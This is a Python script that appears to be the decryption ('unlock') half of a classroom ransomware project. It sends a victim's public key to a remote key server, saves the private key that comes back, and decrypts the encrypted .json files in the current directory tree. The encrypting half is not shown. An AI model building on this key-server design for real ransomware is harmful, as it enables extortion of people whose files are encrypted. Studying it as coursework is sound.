import os
import MyDecrypt, constants

import requests
import json

from base64 import b64encode

#Insert GET request to retrieve the private key for the public key stored on the disk
publicKeyFile = open(constants.PUBLIC_KEY_FILE_PATH, "r")

server_url =  "https://jaydensdisciples.me"

request = server_url + "/keys"

publicKeyContents = publicKeyFile.read()
publicKeyContents = publicKeyContents.replace("\n","*")

headers = { "public_key" : publicKeyContents, "app_key" : "cecs378" }

print(headers)

response = requests.get(request, headers=headers)

print(response.status_code)
print(response.reason)
print(response.text)

assert len(response.json()) > 0, "Public key is not valid"

response_json = response.json()[0]

#  print("Response JSON: \n" + str(response_json))
#
#  print("Public Key from JSON: " + response_json["public_key"])
#  print("Private Key from JSON: " + response_json["private_key"])

privateKeyContents = response_json["private_key"]
privateKeyContents = privateKeyContents.replace("*", "\n")

RSAPrivateKeyFilePath = constants.PRIVATE_KEY_FILE_PATH
privateKeyFile = open(RSAPrivateKeyFilePath, "wb")

privateKeyBytes = bytes(privateKeyContents, 'utf-8')
privateKeyFile.write(privateKeyBytes)
privateKeyFile.close()

# Gather all filenames, traversing subdirectories
for root, dirs, files in os.walk("."):
    # Loop for each file
    for filePath in files:

        filePath = os.path.join(root, filePath)

        # Do not decrypt the private/public key or payload or MyUnlock
        if(not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or
            filePath.endswith(constants.PUBLIC_KEY_FILE_PATH) or
            filePath.endswith(constants.PAYLOAD_FILE_PATH) or
            filePath.endswith(constants.MY_UNLOCK_FILE_PATH) or
            (not filePath.endswith(".json")) or
            os.path.isdir(filePath)
            )):
                # Decrypt the encrypted message
                MyDecrypt.MyRSADecryptMAC(filePath, RSAPrivateKeyFilePath)
